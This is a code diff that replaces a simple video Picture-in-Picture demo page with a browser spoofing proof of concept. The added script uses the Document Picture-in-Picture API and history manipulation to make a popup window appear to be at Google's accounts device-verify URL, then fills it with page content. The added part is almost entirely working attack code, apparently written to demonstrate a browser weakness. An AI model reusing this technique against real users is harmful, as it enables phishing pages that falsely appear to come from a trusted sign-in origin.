@@ -1,35 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-  <meta charset="UTF-8">
-  <title>Picture in Picture Demo</title>
+    <style>
+        #content {
+            display: none;
+        }
+    </style>
 </head>
+
 <body>
+    <h1>Spoof Picture-in-Picture</h1>
 
-<video id="video" width="400" controls>
-  <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-  Browser kamu tidak mendukung video.
-</video>
+    <button id="button">Spoof Button</button>
 
-<br><br>
+    <div id="content">
+        This is not Google.
+    </div>
 
-<button onclick="enablePiP()">Aktifkan PiP</button>
+    <script>
+        const spoof = async () => {
 
-<script>
-async function enablePiP() {
-  const video = document.getElementById('video');
+            const protocol = encodeURIComponent('https');
+            const hostname = encodeURIComponent('accounts.google.com');
+            
+            const spoofedURL = protocol + '://' + hostname + '/login/device/verify';
 
-  try {
-    if (document.pictureInPictureElement) {
-      await document.exitPictureInPicture();
-    } else {
-      await video.requestPictureInPicture();
-    }
-  } catch (err) {
-    console.error("PiP gagal:", err);
-  }
-}
-</script>
+            history.pushState(null, '', '?' + spoofedURL);
 
+            const popupPip = await documentPictureInPicture.requestWindow({
+                width: 350,
+                height: 400
+            });
+
+            setTimeout(() => {
+                history.pushState(null, '', '/');
+                popupPip.history.back();
+            }, 1000);
+
+            popupPip.document.body.append(content);
+        };
+
+        button.onclick = spoof;
+    </script>
 </body>
+
 </html>
